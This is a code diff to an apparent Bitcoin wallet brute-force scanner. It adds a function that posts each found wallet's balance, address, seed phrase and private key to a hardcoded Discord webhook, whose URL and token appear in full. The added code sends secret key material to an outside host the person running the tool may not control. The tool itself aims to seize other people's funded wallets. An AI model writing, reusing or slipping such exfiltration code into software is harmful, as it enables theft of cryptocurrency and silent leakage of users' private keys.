@@ -10,6 +10,13 @@ from multiprocessing import Pool
 import multiprocessing
 import os
 
+def message(title, message):
+    embered = { 'title': message }
+    headers = { "Content-Type": "application/json" }
+    data = {'username': 'doge-scan-bot', 'avatar_url': 'https://i.imgur.com/AfFp7pu.png', 'content': str(title), 'embeds': [embered]}
+    webhook_url = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK"
+    requests.post(webhook_url, json=data, headers=headers)
+
 def timer() :
     tcx = datetime.now().time()
     return tcx
@@ -104,6 +111,7 @@ def seek(i) :
                 f.write('\n==========[PROGRAMMER BY MALPHITE]==========\n')
                 f.close()
                 print(Fore.MAGENTA , 'Information File Name ========> winner.txt [OK]')
+                message('NEW BTC WALLET IS FOUND!', f"[{balance} BTC] \n Address: [{ck.address}] \n Seed: [{ck.seed}] \n Private: [{ck.private_key}]")
                 continue
 
 if __name__ == '__main__':
